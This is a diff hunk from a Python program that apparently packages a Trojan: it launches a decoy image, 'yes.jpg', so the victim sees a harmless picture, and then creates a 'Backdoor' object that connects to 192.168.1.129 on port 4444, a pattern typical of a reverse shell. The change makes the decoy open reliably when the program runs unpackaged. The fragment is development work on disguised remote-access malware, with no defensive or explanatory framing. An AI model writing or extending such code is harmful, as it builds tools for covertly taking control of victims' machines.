@@ -84,7 +84,8 @@ try:
     file_name = sys._MEIPASS + "\yes.jpg"
     subprocess.Popen(file_name, shell=True)
 except Exception:
-    file_name = os.path.abspath("\yes.jpg")
+    file_name = os.path.dirname(os.path.abspath(__file__)) + "\\yes.jpg"
+    subprocess.Popen(file_name, shell=True)
 
 try:
     my_backdoor = Backdoor("192.168.1.129", 4444)
